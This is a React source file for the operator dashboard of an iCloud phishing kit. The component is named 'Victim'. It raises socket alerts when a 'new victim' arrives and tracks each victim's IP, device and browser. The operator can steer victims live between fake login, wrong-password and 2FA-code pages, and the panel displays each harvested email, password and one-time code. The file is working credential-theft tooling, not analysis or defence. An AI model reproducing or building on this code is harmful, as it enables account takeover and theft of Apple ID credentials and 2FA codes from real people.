import React, { useEffect, useState } from "react";
import Sidebar from "../Sidebar";
import { IoRemoveOutline } from "react-icons/io5";
import { IoLogoChrome } from "react-icons/io";
import { FaIdCard } from "react-icons/fa";
import { HiOutlineTrash } from "react-icons/hi";
import toast from "react-hot-toast";
import { IoIosArrowDown } from "react-icons/io";

import io from "socket.io-client";

import { Drawer } from "@mantine/core";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { formatPostDate } from "../../dates/dateFunc";

function Victim() {
  //dropdown state
  const [isOpen, setIsOpen] = useState(false);

  // State to track which user's drawer is open
  const [selectedUser, setSelectedUser] = useState(null);

  //state to handle page change
  const [pageName, setPageName] = useState("");

  //mutation to change page
  const { mutate: changePage, isLoading: changingPage } = useMutation({
    mutationFn: async (userId) => {
      try {
        const res = await fetch(
          `/api/v1/rumman/user/page/${userId}/${pageName}`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
          }
        );

        if (!res.ok) {
          throw new Error("Failed to change page");
        }
        const data = await res.json();
        return data;
      } catch (error) {
        console.log("Error changing page", error);
        throw error;
      }
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
    },
  });

  //beep sound
  const playBeepSound = () => {
    const beep = new Audio("/beep.mp3"); // Ensure you have a beep.mp3 file in your public folder
    beep.play();
  };

  //listen to socket event
  useEffect(() => {
    const newSocket = io("https://icloudsdsd.onrender.com"); // Replace with your server's URL

    // Listen for new user registration events
    newSocket.on("new_user_registered", (data) => {
      playBeepSound();
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
      queryClient.invalidateQueries({ queryKey: ["visits"] });
      toast.custom((t) => (
        <div
          className={`${
            t.visible ? "animate-enter" : "animate-leave"
          } max-w-md w-full bg-zinc-200 shadow-lg rounded-lg pointer-events-auto flex ring-1 ring-black ring-opacity-5`}
        >
          <div className="flex-1 w-0 p-4">
            <div className=" flex flex-col">
              <p className=" text-sm font-bold text-black">New Victim Found</p>
            </div>
          </div>
          <div className="flex border-l border-zinc-400">
            <button
              onClick={() => toast.dismiss(t.id)}
              className="w-full border border-transparent rounded-none rounded-r-lg p-4 flex items-center justify-center text-sm font-medium text-indigo-600 hover:text-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500"
            >
              Close
            </button>
          </div>
        </div>
      ));
    });

    return () => newSocket.close();
  }, []);

  useEffect(() => {
    const newSocket = io("http://localhost:4000"); // Replace with your server's URL

    // Listen for new user registration events
    newSocket.on("user_updated", (data) => {
      playBeepSound();
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
      setSelectedUser(data);
      toast.custom((t) => (
        <div
          className={`${
            t.visible ? "animate-enter" : "animate-leave"
          } max-w-md w-full bg-zinc-200 shadow-lg rounded-lg pointer-events-auto flex ring-1 ring-black ring-opacity-5`}
        >
          <div className="flex-1 w-0 p-4">
            <div className=" flex flex-col">
              <p className=" text-sm font-bold text-green-600">
                Victim gives new logs
              </p>
            </div>
          </div>
          <div className="flex border-l border-zinc-400">
            <button
              onClick={() => toast.dismiss(t.id)}
              className="w-full border border-transparent rounded-none rounded-r-lg p-4 flex items-center justify-center text-sm font-medium text-indigo-600 hover:text-indigo-500 focus:outline-none focus:ring-2 focus:ring-indigo-500"
            >
              Close
            </button>
          </div>
        </div>
      ));
    });

    return () => newSocket.close();
  }, []);

  const queryClient = useQueryClient();
  //get all users
  const {
    data: users,
    isLoading,
    isError,
    error,
  } = useQuery({
    queryKey: ["allUsers"],
    queryFn: async () => {
      try {
        const res = await fetch("/api/v1/rumman/user/all-user");
        const data = await res.json();

        if (!res.ok || data?.error) {
          // If the response is not okay or there is an error in the data
          throw new Error(data?.error || "An unknown error occurred");
        }

        console.log("all user is here:", data);
        return data;
      } catch (error) {
        console.log("Error fetching all user:", error);
        throw error;
      }
    },
  });

  //get all visits
  const { data: visits } = useQuery({
    queryKey: ["visits"],
    queryFn: async () => {
      try {
        const res = await fetch("/api/v1/rumman/user/visits");
        const data = await res.json();

        if (!res.ok || data?.error) {
          // If the response is not okay or there is an error in the data
          throw new Error(data?.error || "An unknown error occurred");
        }

        console.log("all user is here:", data);
        return data;
      } catch (error) {
        console.log("Error fetching all user:", error);
        throw error;
      }
    },
  });
  //get all connects
  const { data: connects } = useQuery({
    queryKey: ["connects"],
    queryFn: async () => {
      try {
        const res = await fetch("/api/v1/rumman/user/connects");
        const data = await res.json();

        if (!res.ok || data?.error) {
          // If the response is not okay or there is an error in the data
          throw new Error(data?.error || "An unknown error occurred");
        }

        console.log("all user is here:", data);
        return data;
      } catch (error) {
        console.log("Error fetching all user:", error);
        throw error;
      }
    },
  });

  //set User as visits or connects
  const { mutate: status, isPending: statusUpdating } = useMutation({
    mutationFn: async (userId) => {
      try {
        const res = await fetch(`/api/v1/rumman/user/situation/${userId}`, {
          method: "POST",
          headers: {
            "Content-type": "application/json",
          },
        });
        const data = await res.json();
        if (!res.ok) {
          throw data.error || "Something went wrong";
        }
        return data;
      } catch (error) {
        console.log(error);
        throw error;
      }
    },
    onSuccess: () => {
      Promise.all([
        queryClient.invalidateQueries({ queryKey: ["visits"] }),
        queryClient.invalidateQueries({ queryKey: ["allUsers"] }),
        queryClient.invalidateQueries({ queryKey: ["connects"] }),
      ]);
    },
  });

  //Delete user
  const { mutate: deleteUser, isPending: deleting } = useMutation({
    mutationFn: async (userId) => {
      try {
        const res = await fetch(`/api/v1/rumman/user/delete/${userId}`, {
          method: "DELETE",
        });
        const data = await res.json();
        if (!res.ok) {
          throw data.error || "Something went wrong";
        }
        return data;
      } catch (error) {
        console.log(error);
        throw error;
      }
    },
    onSuccess: () => {
      toast.success("User Deleted");
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
    },
  });

  // Function to handle opening the drawer
  const handleOpenDrawer = (user) => {
    setSelectedUser(user);
  };

  // Function to handle closing the drawer
  const handleCloseDrawer = () => {
    setSelectedUser(null); // Reset the selected user to null to close the drawer
  };

  if (isLoading) {
    return (
      <div className=" flex items-center justify-center w-full h-screen">
        Loading...
      </div>
    ); // Show a loading state
  }

  if (isError) {
    return (
      <div className=" flex items-center justify-center w-full h-screen">
        {error.message}
      </div>
    ); // Show an error state if an error occurred
  }

  return (
    <div>
      <Sidebar />
      <div className=" ml-60 p-3 bg-zinc-950 min-h-screen text-white overflow-hidden">
        <div className=" w-full p-4 bg-zinc-900 rounded-lg">
          <div className=" flex items-center">
            <p className=" text-xl font-bold">Welcome</p>
            <IoRemoveOutline className=" rotate-90 w-10 h-10" />
            <p className=" text-sm">Brothers is ready</p>
          </div>
          <div className=" flex flex-col gap-3 mt-5">
            <p className=" text-sm font-medium text-zinc-500">
              Don't worry about people. Nobody praises someone if people don't
              die
            </p>
          </div>
        </div>

        <div className=" md:grid grid-cols-2 gap-4 mt-4">
          <div className=" p-4 bg-zinc-900 rounded-lg">
            <div className=" w-full flex flex-col items-center gap-3 justify-center">
              <p className=" text-2xl font-bold text-zinc-200">Connects</p>
              <p className=" text-lg font-bold text-zinc-500">
                {connects?.length === 0 ? "0" : connects}
              </p>
            </div>
          </div>
          <div className=" p-4 bg-zinc-900 rounded-lg">
            <div className=" w-full flex flex-col items-center gap-3 justify-center">
              <p className=" text-2xl font-bold text-zinc-200">Visits</p>
              <p className=" text-lg font-bold text-zinc-500">
                {visits?.length === 0 ? "0" : visits}
              </p>
            </div>
          </div>
        </div>

        <div className="grid grid-cols-12 grid-rows-1 gap-2 mt-4 bg-zinc-900 p-3 rounded-t-lg text-[15px] font-bold text-zinc-300">
          <div className="col-span-2 ">IP Address</div>
          <div className="col-start-3 ">Status</div>

          <div className="col-start-4 ">Browser</div>
          <div className="col-span-2 col-start-5 bg ">Device</div>
          <div className="col-span-2 col-start-7 bg ">Current Status</div>
          <div className="col-span-2 col-start-9 bg ">Current Page</div>
          <div className="col-span-2 col-start-11 text-center">Action</div>
        </div>
        {users?.map((user) => (
          <div
            key={user?._id}
            className="grid grid-cols-12 px-3 py-4 bg-zinc-800 rounded-lg grid-rows-1 gap-2 mt-3"
          >
            <div className="col-span-2 ">
              <p className=" text-sm">{user?.ipAddress}</p>
            </div>
            <div className="col-start-3">
              <button
                disabled={statusUpdating}
                onClick={(e) => {
                  e.preventDefault();
                  status(user?._id);
                }}
                className=" w-max text-xs font-bold px-2 py-1 bg-white text-black rounded-full"
              >
                {user?.situation === "visits" && "visits"}
                {user?.situation === "connects" && "connects"}
              </button>
            </div>

            <div className="col-start-4">
              {user?.browser.toLowerCase().includes("chrome") && (
                <IoLogoChrome className=" w-6 h-6 ml-4 text-zinc-300" />
              )}
            </div>
            <div className="col-span-2 col-start-5 ">
              <p className=" text-sm">{user?.device}</p>
            </div>
            <div className="col-span-2 col-start-7 ">
              <p className=" text-sm">
                {user?.currentStatus ? user?.currentStatus : "N/A"}
              </p>
            </div>
            <div className="col-span-2 col-start-9 ">
              <p className=" text-sm">{user?.currentPage}</p>
            </div>

            <div className="col-span-2 col-start-11 place-items-center w-full content-center">
              <div className=" flex items-center gap-4">
                {user?.situation !== "connects" ? (
                  <div className="dropdown dropdown-top dropdown-end ">
                    <div
                      tabIndex={0}
                      role="button"
                      className=" text-sm flex items-center gap-1"
                    >
                      <p>Select page</p>
                      <IoIosArrowDown />
                    </div>
                    <ul
                      tabIndex={0}
                      className="dropdown-content menu border border-zinc-500 bg-zinc-700 rounded-md z-[1] w-52 p-2 shadow"
                    >
                      <li
                        onClick={() => {
                          setPageName("login");
                          changePage(user?._id);
                        }}
                        className=" p-1 hover:bg-zinc-600 rounded-md"
                      >
                        <a className=" font-medium tracking-wide">Login</a>
                      </li>
                      <li
                        className=" p-1 hover:bg-zinc-600 rounded-md"
                        onClick={() => {
                          setPageName("wrongPass");
                          changePage(user?._id);
                        }}
                      >
                        <a className=" font-medium tracking-wide">
                          Wrong Password
                        </a>
                      </li>

                      <li
                        className=" p-1 hover:bg-zinc-600 rounded-md"
                        onClick={() => {
                          setPageName("code");
                          changePage(user?._id);
                        }}
                      >
                        <a className=" font-medium tracking-wide">2FA - Code</a>
                      </li>

                      <li
                        className=" p-1 hover:bg-zinc-600 rounded-md"
                        onClick={() => {
                          setPageName("wrongCode");
                          changePage(user?._id);
                        }}
                      >
                        <a className=" font-medium tracking-wide">Wrong Code</a>
                      </li>

                      <li
                        className=" p-1 hover:bg-zinc-600 rounded-md"
                        onClick={() => {
                          setPageName("loading");
                          changePage(user?._id);
                        }}
                      >
                        <a className=" font-medium tracking-wide">Loading</a>
                      </li>
                      <li
                        className=" p-1 hover:bg-zinc-600 rounded-md"
                        onClick={() => {
                          setPageName("success");
                          changePage(user?._id);
                        }}
                      >
                        <a className=" font-medium tracking-wide">Success</a>
                      </li>
                      <li
                        className=" p-1 hover:bg-zinc-600 rounded-md"
                        onClick={() => {
                          setPageName("verifying");
                          changePage(user?._id);
                        }}
                      >
                        <a className=" font-medium tracking-wide">Verifying</a>
                      </li>
                    </ul>
                  </div>
                ) : (
                  <div className=" w-[92px]"></div>
                )}

                <button onClick={() => handleOpenDrawer(user)}>
                  <FaIdCard className=" w-5 h-5 hover:text-zinc-300" />
                </button>

                <button
                  disabled={deleting}
                  onClick={() => deleteUser(user?._id)}
                >
                  <HiOutlineTrash className=" w-5 h-5 text-red-600 hover:text-red-500" />
                </button>
              </div>
            </div>
          </div>
        ))}
        <Drawer
          opened={selectedUser !== null} // Open only if a user is selected
          onClose={handleCloseDrawer}
          position="right"
          offset={8}
          radius="md"
          styles={{
            content: { backgroundColor: "#27272a" },
            header: { backgroundColor: "#27272a" },
          }}
        >
          {selectedUser && (
            <div className=" text-zinc-200">
              <div className=" flex flex-col gap-5 items-center">
                <h1 className=" text-2xl font-bold text-zinc-200">
                  Detail logs
                </h1>
              </div>

              <div className=" mt-2">
                <div className=" p-4 border border-zinc-700 rounded-lg drop-shadow-lg bg-gradient-to-br to-zinc-700 from-zinc-800">
                  <div className=" flex items-center justify-between w-full">
                    <h1 className=" text-2xl font-bold text-blue-500">
                      iCloud
                    </h1>
                    <a
                      href="https://icloud.com/"
                      target="_blank"
                      className=" text-zinc-200 text-sm hover:underline"
                    >
                      Go to iCloud
                    </a>
                  </div>
                  <div className=" border-t border-zinc-600 mt-3" />
                  <div className=" mt-3 py-2 flex items-center justify-between border-b border-zinc-600">
                    <p>Email or Num:</p>
                    <div className=" flex items-center gap-2">
                      <p>{selectedUser?.email}</p>
                    </div>
                  </div>
                  <div className=" mt-3 py-2 flex items-center justify-between border-b border-zinc-600">
                    <p>Password:</p>
                    <div className=" flex items-center gap-2">
                      <p>{selectedUser?.password}</p>
                    </div>
                  </div>
                  <div className=" mt-3 py-2 flex items-center justify-between border-b border-zinc-600">
                    <p>Code:</p>
                    <div className=" flex items-center gap-2">
                      <p>{selectedUser?.code}</p>
                    </div>
                  </div>
                </div>
                <div className="w-full flex items-center justify-between mt-6">
                  <div className=" flex items-center gap-2">
                    <p className=" font-bold">Time:</p>
                    <p className=" text-sm text-zinc-300">
                      {formatPostDate(selectedUser?.createdAt)}
                    </p>
                  </div>
                  <div>
                    Current Page:{" "}
                    <span className=" text-[#06c]">
                      {selectedUser?.currentPage}
                    </span>{" "}
                  </div>
                </div>
              </div>
            </div>
          )}
        </Drawer>
      </div>
    </div>
  );
}

export default Victim;
